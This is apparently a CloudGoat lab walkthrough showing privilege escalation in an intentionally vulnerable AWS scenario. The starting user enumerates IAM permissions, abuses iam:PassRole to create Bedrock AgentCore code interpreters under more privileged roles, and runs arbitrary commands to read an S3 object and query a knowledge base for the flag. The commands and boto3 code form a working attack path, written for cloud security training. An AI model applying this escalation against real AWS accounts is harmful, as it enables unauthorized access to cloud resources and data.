### 1. Configuring Credentials
After launching the scenario, you will be provided with an Access Key ID and Secret Access Key. Configure these as a profile with the AWS CLI.

```bash 
aws configure --profile sandy
``` 

### 2. Confirming Credentials
After setting up the profile, it's always a good idea to confirm the credentials. You can do this with the following command:

```bash
aws sts get-caller-identity --profile sandy
```
This should provide you with the UserId, Account #, and ARN for the starting user.


### 3. Checking Our Permissions
Now that we have confirmed initial access, we want to see which permissions our user has in the AWS environment. One way we can do this is by seeing if our user has any policies attached or assigned to them. In AWS, a policy is essentially a JSON document that defines what actions (e.g., read, write) are allowed or denied on which resources (e.g., an S3 bucket, an EC2 instance). Policies can be attached to IAM users, groups, and roles to control their permissions and enforce security boundaries.

#### Inline Policies
Let's first check for inline policies. Inline policies are AWS IAM policies that are embedded directly into a single IAM user, group, or role. Unlike managed policies (which are standalone and can be attached to multiple entities), inline policies exist only for the specific entity they are attached to, so they provide a unique set of permissions that are tightly coupled to that one user, group, or role.

```bash
aws iam list-user-policies --user-name sandy_<cloudgoat_id> --profile sandy
```

#### Managed Policies
We do not have any inline policies. Let's check for managed policies. Managed policies are standalone IAM policies that are not embedded directly into a single entity. They can be created and administered either by AWS (AWS-managed policies) or by customers themselves (customer-managed policies). These policies can be attached to multiple users, groups, or roles, making them easier to maintain and reuse across different entities in your AWS environment.

```bash
aws iam list-attached-user-policies --user-name sandy_<cloudgoat_id> --profile sandy
```

We have 2 attached policies:

- `agent_access_policy_<cloudgoat_id>`
- `IAMReadOnlyAccess` (This is what enables us to examine our own permissions the easy way)

We can use the get-policy operation to identify the default policy version of each of these policies, then get the policy version to obtain the permissions associated with these attached policies.

```bash
aws iam get-policy --policy-arn [Policy ARN] --profile sandy
aws iam get-policy-version --policy-arn [Policy ARN] --version-id [DefaultVersionId] --profile sandy
```

Doing this for our attached policies shows us that our user can perform:

- IAM read operations
- Bedrock read operations: `bedrock:Get*` & `bedrock:List*`
- AgentCore read operations: `bedrock-agentcore:Get*` & `bedrock-agentcore:List*`
- PassRole for all roles with the `agentcore_` prefix
- AgentCore Code Interpreter Management: `bedrock-agentcore:*CodeInterpreter*`

### 4. Role Identification

So we can pass roles... `iam:PassRole` is commonly used to escalate privileges, to we examine the privileges of the roles we can pass.

First we identify them:
```bash
aws iam list-roles --query "Roles[?starts_with(RoleName, 'agentcore_')].Arn" --profile sandy
```

There are two roles of interest:
- `agentcore_code_interpreter_execution_role_<cloudgoat_id>`
- `agentcore_agent_runtime_role_<cloudgoat_id>`

We can see their AssumeRole policies by getting the role details:
```bash
aws iam get-role --role-name [Role Name] --profile sandy
```
Note they both trust the `bedrock-agentcore.amazonaws.com` service principal. This makes sense agent runtimes and code interpreters both fall under the agentcore service umbrella. 

If we follow step 3 again, using the role-based operations instead of the user-based ones, we can learn the privileges of these roles too:
- `agentcore_code_interpreter_execution_role_<cloudgoat_id>`
  - Can access the `cg-codeinterpreter-artifacts-<cloudgoat_id>` bucket
- `agentcore_agent_runtime_role_<cloudgoat_id>`
  - Can invoke all bedrock foundation models
  - Can invoke all agentcore code interpreters
  - Can query a knowledgebase

### 5. Examining Code Interpreters

We have code interpreter management permissions, so lets see what we have to work with:

```bash
aws bedrock-agentcore-control list-code-interpreters --profile sandy
```

This reveals no existing code interpreters we can leverage. So if we want to use any, we'll have to make them ourselves.

### 6. (Optional) Getting to the S3 bucket

We have what's clearly a code interpreter role, and permissions to manage code interpreters, so we start there. Code interpreters can be granted execution roles, so they can potentially access other AWS resources if configured correctly.

We create a code interpreter with the code interpreter role:
```bash
aws bedrock-agentcore-control create-code-interpreter --name interpreter_1 --execution-role-arn [CodeInterpreter Role Arn] --network-configuration networkMode=PUBLIC --profile sandy
```

This gives us a code interpreter ID, which we'll need to directly invoke it. Code interpreters cannot be invoked directly from the command line, but can be invoked via boto3. We can define a function that calls it fairly easily (though some more work is needed to gracefully handle errors):
```python
import boto3
session = boto3.Session(profile_name='sandy', region_name='<REGION>')
bedrock_agentcore_client = session.client('bedrock-agentcore')

CODE_INTERPRETER_ID = '<CODE_INTERPRETER_ID>'
session = bedrock_agentcore_client.start_code_interpreter_session(
  codeInterpreterIdentifier=CODE_INTERPRETER_ID,
)

def run_command_and_print_results(code):
  response = bedrock_agentcore_client.invoke_code_interpreter(
    codeInterpreterIdentifier=CODE_INTERPRETER_ID,
    sessionId=session['sessionId'],
    name='executeCommand',
    arguments={'command': code}
  )
  for event in response['stream']:
    print(event['result']['structuredContent']['stdout'])      
```

We can use this function to pass arbitrary bash commands (including AWS CLI commands). You will sometimes need to specify a pager when running these commands...

We know which S3 bucket the code interpreter can access, so we can query about that:
```
>>> run_command_and_print_results('aws s3 ls s3://cg-codeinterpreter-artifacts-<cloudgoat_id>')
2025-11-29 21:43:51         35 flag.txt

>>> run_command_and_print_results('aws s3 cp s3://cg-codeinterpreter-artifacts-<cloudgoat_id>/flag.txt ./flag.txt && cat ./flag.txt')
download: s3://cg-codeinterpreter-artifacts-<cloudgoat_id>/flag.txt to ./flag.txt
Your flag is in another location...

```

Not the final target, but a neat exercise on accessing S3 objects via code interpreters.

### 7. Getting to the KnowledgeBase

Since agentcore runtime execution roles and code interpreter execution roles need to trust the same service principal, we can actually create a code interpreter with an agent runtime role, provided there are no additional conditions in the assumerole policy aside from the required service principal. 

Since (if you completed step 6) we already checked the code interpreter s3 bucket and found nothing, and know that there are no other code interpreters, all that remains is to check the accessible knowledgebase.

We create a code interpreter with the agent runtime role:
```bash
aws bedrock-agentcore-control create-code-interpreter --name interpreter_2 --execution-role-arn [AgentRuntime Role Arn] --network-configuration networkMode=PUBLIC --profile sandy
```

This gives us a code interpreter ID, which we'll need to directly invoke it. Code interpreters cannot be invoked directly from the command line, but can be invoked via boto3. We can define a function that calls it fairly easily (though some more work is needed to gracefully handle errors):
```python
import boto3
session = boto3.Session(profile_name='sandy', region_name='<REGION>')
bedrock_agentcore_client = session.client('bedrock-agentcore')

CODE_INTERPRETER_ID = '<CODE_INTERPRETER_ID>'
session = bedrock_agentcore_client.start_code_interpreter_session(
  codeInterpreterIdentifier=CODE_INTERPRETER_ID,
)

def run_command_and_print_results(code):
  response = bedrock_agentcore_client.invoke_code_interpreter(
    codeInterpreterIdentifier=CODE_INTERPRETER_ID,
    sessionId=session['sessionId'],
    name='executeCommand',
    arguments={'command': code}
  )
  for event in response['stream']:
    print(event['result']['structuredContent']['stdout'])      
```

We can use this function to pass arbitrary bash commands (including AWS CLI commands). You will sometimes need to specify a pager when running these commands...

We know which knowledgebase the execution role can access from the IAM policy on the execution role (the ID is the last part of the ARN), and we can query it using the `retrieve` command (be sure to fill out `<REGION>` or it will error out):
```
>>> run_command_and_print_results('PAGER=cat aws bedrock-agent-runtime retrieve --knowledge-base-id [KnowledgeBase ID] --retrieval-query text="flag" --query "retrievalResults[*].content.text"')
[
    "<FLAG>"
]
```
